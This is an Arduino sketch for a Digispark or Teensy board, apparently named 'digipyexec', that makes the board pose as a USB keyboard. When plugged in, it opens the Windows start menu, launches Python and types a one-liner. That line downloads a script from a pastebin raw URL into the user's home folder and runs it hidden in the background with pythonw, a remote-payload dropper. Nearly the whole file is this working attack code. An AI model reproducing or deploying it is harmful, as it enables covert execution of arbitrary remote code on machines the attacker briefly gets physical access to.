/*============================================================================
MIT License
Copyright (c) 2020 github.com/whyire
                   ___       _                                
              ____/ (_)___ _(_)___  __  _____  _  _____  _____
             / __  / / __ `/ / __ \/ / / / _ \| |/_/ _ \/ ___/
            / /_/ / / /_/ / / /_/ / /_/ /  __/>  </  __/ /__  
            \__,_/_/\__, /_/ .___/\__, /\___/_/|_|\___/\___/  
                   /____/ /_/    /____/ v1.1
Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
============================================================================*/

/* SETTINGS */
#define PY_SCRIPT_URL "https://pastebin.com/raw/JMVWuNc5"
#define PY_SCRIPT_NAME "pyscr.py"

//#define TEENSY //only do this if programming a teensy
#define UK_KEYBOARD

#define START_DELAY 1200
#define START_MENU_DELAY 600
#define START_MENU_SEARCH_DELAY 100
#define PYTHON_WINDOW_OPEN_DELAY 300

#ifdef TEENSY
  #define US_KEYBOARD
#else
  #include "DigiKeyboard.h"
#endif


void print(char* str) {
  //print on both teensy and dspark
  #ifdef TEENSY
    Keyboard.print(str);
  #else
    DigiKeyboard.print(str);
  #endif
}
void wait(int t) {
  //delay on both teensy and dspark
  #ifdef TEENSY
    delay(t);
  #else
    DigiKeyboard.delay(t);
  #endif
}
void winKey() {
  //windows key on both teensy and dspark
  #ifdef TEENSY
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.release(KEY_LEFT_GUI);
  #else
    DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
  #endif
}
void enter() {
  //windows key on both teensy and dspark
  #ifdef TEENSY
    Keyboard.press(KEY_ENTER);
    Keyboard.release(KEY_ENTER);
  #else
    DigiKeyboard.sendKeyStroke(0, KEY_ENTER);
  #endif
}



void setup() {
  /*   Open python prompt   */
  wait(START_DELAY);
  winKey();
  wait(START_MENU_DELAY);
  print("python.exe");
  wait(START_MENU_SEARCH_DELAY);
  enter();
  wait(PYTHON_WINDOW_OPEN_DELAY);

  
  /*   Python script   */
  // All is in one line but split into multiple prints for readability
  print("import subprocess,os,urllib.request as r;");
  // Change directory to home as we may not have permission to edit in the python folder
  #ifdef US_KEYBOARD
    print("os.chdir(os.path.expanduser('~'));");
  #elif UK_KEYBOARD
    print("os.chdir(os.path.expanduser('|'));");
  #endif
  // Create the file with the name of PY_SCRIPT_NAME which will run in the background as our payload
  print("f=open('");print(PY_SCRIPT_NAME);print("','wb');");
  print("f.write(r.urlopen('");print(PY_SCRIPT_URL);print("').read());");
  print("f.close();");
  // Open the script we just made with pythonw (so it runs in background)
  print("subprocess.Popen('pythonw.exe ");print(PY_SCRIPT_NAME);print("',creationflags=8,close_fds=True);");
  // Close python prompt when done
  print("exit();");
  enter();
}void loop() {}

